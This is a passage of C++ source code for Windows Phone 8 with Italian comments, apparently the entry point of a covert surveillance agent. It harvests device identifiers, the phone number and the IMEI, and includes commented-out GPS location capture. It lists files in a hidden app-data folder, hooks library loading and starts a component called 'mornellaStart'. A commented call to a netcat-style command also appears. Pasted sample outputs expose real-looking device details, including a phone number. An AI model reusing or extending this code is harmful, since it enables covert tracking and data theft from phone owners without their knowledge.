	DeviceManufacturer,
	DeviceName = 5,
	DeviceHardwareVersion,
	DeviceFirmwareVersion = 8
}
	 */
/***
	 //DeviceManufacturer	
	_QueryPhoneInformation(0,stringBuilder,sizeof(stringBuilder),NULL);

	//DeviceName
	_QueryPhoneInformation(5,stringBuilder,sizeof(stringBuilder),NULL);

	//DeviceHardwareVersion
	_QueryPhoneInformation(6,stringBuilder,sizeof(stringBuilder),NULL);

	//DeviceFirmwareVersion
	_QueryPhoneInformation(8,stringBuilder,sizeof(stringBuilder),NULL);
	***/
	
	
	DWORD ret;
	WCHAR msg[1024];
	

	for(DWORD ix=0;ix<0xf;ix++)
	{
		bool rrr=_QueryPhoneInformation(ix,stringBuilder,sizeof(stringBuilder)/sizeof(WCHAR),&ret);
#ifdef _DEBUG
		swprintf_s(msg, TEXT("%i) %s\n"),ix,stringBuilder);OutputDebugString(msg);
#endif
	}
	
	/*
	0) NOKIA
1) 
2) 000-IT
3) CV ID 232.O2
4) Lumia 820
5) RM-825_eu_italy_232 
6) 1.0.0.0
7) 8960
8) 1232.2109.1242.1002
9) 
10) 1.0.202041.3
11) 
12) 
13) 
14) http://link.nokia.com/support
15) Windows Phone 8 ByGio
	*/
/*
0) NOKIA [Produttore]
1) 
2) 000-GB  [Carrier]
3) CV GB SW Variant ID 276 v03
4) Lumia 920 [Modello]
5) RM-821_eu_euro1_276 [Nome Fw]
6) 1.0.0.0 [HW Revision Number]
7) 8960 [Chip Soc Version]
8) 1232.2110.1244.3003 [FW Rev Number]
9) [Radio HW Ver]
10) 1.0.202041.3 [Radio SW Ver]
11) 
12) +448450455555
13) 
14) http://link.nokia.com/support
15) WP920 [Nome Tel Scelto dall'utente]
*/

	/*
0) HTC  [Produttore]
1) 0
2) 000-33
3) 
4) Windows Phone 8S by HTC [Modello]
5) Windows Phone 8S by HTC [Nome Fw]
6) 0001 [HW Revision Number]
7) 8227 [Chip Soc Version]
8) 1030.54.10403.401 [FW Rev Number]
9) 1.102.0.D4  [Radio HW Ver]
10) 1.11b.3054.25_10.13.30.54P [Radio SW Ver]
11) 0.0.1030.54(159870) [Boot Loader Version]
12) +33-170-759-171 [Call Support]
13) 
14) 
15) Windows Phone [Nome Tel Scelto dall'utente]
	*/


	//

	//Microsoft.Phone.Info.DeviceExtendedProperties.GetValue("DeviceUniqueId");

	 PROCESS_MEMORY_COUNTERS memCounter;
	_DevicePropertiesGetProcessMemoryInfo( &memCounter,sizeof( memCounter ));

	/*
	if ("DeviceTotalMemory" == propertyName)
						{
							uint num = 0u;
							bool flag2 = Registry.QueryDwordValue(2147483650u, "Software\\Microsoft\\AppPlatform", "OverrideDeviceMemoryAPI", ref num);
							propertyValue = (long)((ulong)num);
							if (!flag2)
							{
								DeviceInfoNativeMethods.MEMORYSTATUS mEMORYSTATUS = default(DeviceInfoNativeMethods.MEMORYSTATUS);
								mEMORYSTATUS.dwLength = (uint)Marshal.SizeOf(mEMORYSTATUS);
								DeviceInfoNativeMethods.GlobalMemoryStatus(ref mEMORYSTATUS);
								propertyValue = (long)mEMORYSTATUS.ullTotalPhys;
							}
	*/

	MEMORYSTATUS memStatus;
	memStatus.dwLength = sizeof(memStatus);
	_DevicePropertiesGlobalMemoryStatus(&memStatus);







		BYTE *pImei2;
		BYTE alloco[64];
		pImei2=alloco;
		_GetIMEI(pImei2);

}
/*
per poter compilare la RELEASE forzando tutti i paramentri di _DEBUG devo linkare la lib MSVCRTD.dll e devo far ignorare la lib MSVCRT.dll altrimenti mi da' l'errore  error LNK2001: unresolved external symbol +"__imp___CrtDbgReportW"
*/

using namespace Windows::Devices::Geolocation;
using namespace Windows::System::Threading;
using namespace Windows::Foundation;
#include <ppltasks.h>
using namespace concurrency;


#ifdef _DEBUG
#include <stack>
bool ListFiles4(wstring path, wstring mask, vector<wstring>& files)
{
	HANDLE hFind = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA fdata;
	wstring fullpath;
	stack<wstring> folders;
	folders.push(path);
	files.clear();

	WCHAR stringa[1024];
	WCHAR stringaOut[1024];
///	HINSTANCE LibHandle;

		
	while (!folders.empty())
	{
		path = folders.top();
		fullpath = path + L"\\" + mask;
		folders.pop();

		hFind = _FindFirstFile(fullpath.c_str(), &fdata);

		if (hFind != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (wcscmp(fdata.cFileName, L".") != 0 &&
                    wcscmp(fdata.cFileName, L"..") != 0)
				{
					if (fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						folders.push(path + L"\\" + fdata.cFileName);
						
						swprintf_s(stringa,L"%s\\%s",path.c_str(),fdata.cFileName);
						swprintf_s(stringaOut,L"%s\\%s [DIR]\n",path.c_str(),fdata.cFileName);
						OutputDebugString(  stringaOut );
						

					}
					else
					{
						files.push_back(path + L"\\" + fdata.cFileName);
						
						swprintf_s(stringa,L"%s\\%s",path.c_str(),fdata.cFileName);
						swprintf_s(stringaOut,L"%s\\%s\n",path.c_str(),fdata.cFileName);
						OutputDebugString(  stringaOut );
						
					}
				}
			}
			while (FindNextFile(hFind, &fdata) != 0);
		}
		else
		{
		
				//LPVOID lpMsgBuf;
				WCHAR lpMsgBuf[512];
	
				FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), 0, (LPWSTR) lpMsgBuf, sizeof(lpMsgBuf), NULL );

				swprintf_s(stringa,L">>>>>>>>>>>>>>>>>>>>>>>>>>>>> FindFirstFile:%s err:%i : %s\n",fullpath.c_str(),GetLastError(),lpMsgBuf);
				OutputDebugString(  stringa );

	}
		

		/*
		if (GetLastError() != ERROR_NO_MORE_FILES)
		{
			FindClose(hFind);

			//return false;
			return true;
		}
		*/
		FindClose(hFind);
		hFind = INVALID_HANDLE_VALUE;
	}

	return true;
}


void DebugListLocalDir4()
{
		vector<wstring> files1;
		//ListFiles(L"C:\\Data\\programs\\{8321B710-9C57-40FE-8EE1-6FF32A86A9E7}", L"*", files1);
		//ListFiles(L"C:\\Data\\SharedData\\PhoneTools\\11.0\\Debugger", L"*", files1);
		ListFiles4(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\", L"*", files1);

}
#endif

	extern "C" int CmdNC(void);

[Platform::MTAThread]
int main(Platform::Array<Platform::String^>^)
{
/*
       //singola acquisizione GPS

		Windows::Devices::Geolocation::Geolocator^ geolocator;
		geolocator = ref new Geolocator();

		IAsyncOperation<Geoposition^> ^operation = geolocator->GetGeopositionAsync();
		operation->Completed = ref new AsyncOperationCompletedHandler<Geoposition^>(
        [=] (IAsyncOperation<Geoposition^>^ asyncOperation, Windows::Foundation::AsyncStatus status) mutable
        {
            if(status != Windows::Foundation::AsyncStatus::Error)
            {
               Geoposition^ geoposition = asyncOperation->GetResults();

               // use the location information
               double latitude = geoposition->Coordinate->Latitude;
               double longitude = geoposition->Coordinate->Longitude;
               double accuracy = geoposition->Coordinate->Accuracy;

            }
            else
            {
				if(asyncOperation->ErrorCode.Value == E_ABORT)
				{
					// The user has disable location in the phone settings
				}
				else
				{
					// There was another error
				}
            }
        });
*/
/*
	////singola acquisizione GPS con wait	
	Windows::Devices::Geolocation::Geolocator^ geolocator;
    concurrency::cancellation_token_source geopositionTaskTokenSource;

	geolocator = ref new Geolocator();
	
    task<Geoposition^> geopositionTask(geolocator->GetGeopositionAsync(), geopositionTaskTokenSource.get_token());

	geopositionTask.then([=](task<Geoposition^> getPosTask)
    {
	   Geoposition^ pos = getPosTask.get();

	   auto Text1 = pos->Coordinate->Latitude.ToString();
       auto Text2 = pos->Coordinate->Longitude.ToString();
       auto Text3 = pos->Coordinate->Accuracy.ToString();
	 }).wait();

*/	 
	setLoadLibraryExW();
	//se rimuovo la dir rimetto in scan la bk
	//RemoveDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\TempApp\\");

#ifdef _DEBUG	
	//DebugListLocalDir4();
#endif

	if(!_SetCurrentDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\TempApp\\"))
	{
		
#ifdef _DEBUG	
		testVari();
#endif

	
	//int xyz=CmdNC();

		mornellaStart();
	}
	return 0;
}